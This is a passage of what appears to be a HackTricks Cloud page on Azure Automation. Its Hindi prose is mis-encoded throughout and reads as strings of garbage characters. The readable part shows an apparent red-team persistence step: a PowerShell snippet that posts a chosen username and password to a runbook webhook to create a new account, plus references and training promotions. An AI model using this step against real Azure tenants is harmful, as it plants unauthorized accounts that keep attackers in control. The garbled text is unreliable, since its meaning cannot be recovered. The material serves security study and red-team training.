* **‡§®‡•ã‡§ü:** ‡§ê‡§∏‡•Ä ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§® ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§™‡§∞ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§ñ‡•ã‡§®‡•á ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

#### 6. ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§ø‡§∞‡•ç‡§Æ‡§æ‡§£ ‡§ï‡•ã ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞ ‡§ï‡§∞‡•á‡§Ç

* ‡§è‡§ï POST ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§≠‡•á‡§ú‡§ï‡§∞ ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡•á‡§¨‡§π‡•Å‡§ï ‡§ï‡•ã ‡§ü‡•ç‡§∞‡§ø‡§ó‡§∞ ‡§ï‡§∞‡•á‡§Ç‡•§
* ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§ø‡§è ‡§ó‡§è PowerShell ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç, ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§ï‡§ø `$uri` ‡§ï‡•ã ‡§Ü‡§™‡§ï‡•á ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§µ‡•á‡§¨‡§π‡•Å‡§ï URL ‡§∏‡•á ‡§¨‡§¶‡§≤‡•á‡§Ç ‡§î‡§∞ `$AccountInfo` ‡§ï‡•ã ‡§á‡§ö‡•ç‡§õ‡§ø‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ ‡§î‡§∞ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§
```powershell
$uri = "<YOUR_WEBHOOK_URL>"
$AccountInfo  = @(@{RequestBody=@{Username="<DESIRED_USERNAME>";Password="<DESIRED_PASSWORD>"}})
$body = ConvertTo-Json -InputObject $AccountInfo
$response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
```
## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://learn.microsoft.com/en-us/azure/automation/overview](https://learn.microsoft.com/en-us/azure/automation/overview)
* [https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview](https://learn.microsoft.com/en-us/azure/automation/automation-dsc-overview)
* [https://github.com/rootsecdev/Azure-Red-Team#runbook-automation](https://github.com/rootsecdev/Azure-Red-Team#runbook-automation)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
